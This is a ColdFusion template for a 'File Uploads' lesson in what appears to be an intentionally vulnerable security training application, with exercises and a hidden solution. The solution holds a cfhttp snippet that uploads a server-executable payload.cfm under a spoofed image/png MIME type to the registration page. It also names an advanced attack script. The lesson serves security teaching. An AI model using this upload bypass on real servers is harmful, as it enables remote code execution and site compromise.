<cfset lessonID = "uploads">
<cfoutput>
<div class="panel panel-default">
    <div class="panel-heading" role="tab" id="#lessonID#Heading">
        <h3 class="panel-title">
            <a role="button" data-toggle="collapse" data-parent="##accordion" href="###lessonID#Body" aria-expanded="false" aria-controls="#lessonID#Body">
                File Uploads
            </a>
        </h3>
    </div>
    <div id="#lessonID#Body" class="panel-collapse collapse" role="tabpanel" aria-labelledby="#lessonID#Heading">
        <div class="panel-body">
            <h5>Can you locate File Upload Code?</h5>
            <p>Hint search code for <code>cffile</code> or <code>fileUpload</code> or simply <code>upload</code>  </p>

            <h5>Can you upload a <code>cfm</code> file?</h5>

            <h5>Uncomment lines 13-18 in register.cfm, now can you upload a cfm file?</h5>
            
            <h5>Fix code</h5>

            <br>


            <button class="btn btn-primary" type="button" data-toggle="collapse" data-target="###lessonID#Hint" aria-expanded="false" aria-controls="#lessonID#Hint">
                Show Hint
            </button>
            <button class="btn btn-primary" type="button" data-toggle="collapse" data-target="###lessonID#Example" aria-expanded="false" aria-controls="#lessonID#Example">
                Show Solutions
            </button>
            <br><br>
            <div class="collapse" id="#lessonID#Hint">
              <div class="well">
                    Would you ever trust a MIME?
              </div>
            </div>
            <div class="collapse" id="#lessonID#Example">
              <div class="well">
                    <cfset reqUrl = getPageContext().getRequest().getRequestURL()>
                    <cfset reqUrl = reReplaceNoCase(reqUrl, "/lessons/.*", "/my-account/register.cfm")>
                    <pre>&lt;cfhttp url="#reqUrl#" method="POST"&gt;
    &lt;cfhttpparam type="file" name="photo" mimetype="image/png" file="##expandPath("./payload.cfm")##"&gt;
&lt;/cfhttp&gt;</pre>
                    <p>For a more advanced approach see: <code>/tools/scripts/load-attack.cfm</code> 
              </div>
            </div>
            

        </div>
    </div>
</div>
</cfoutput>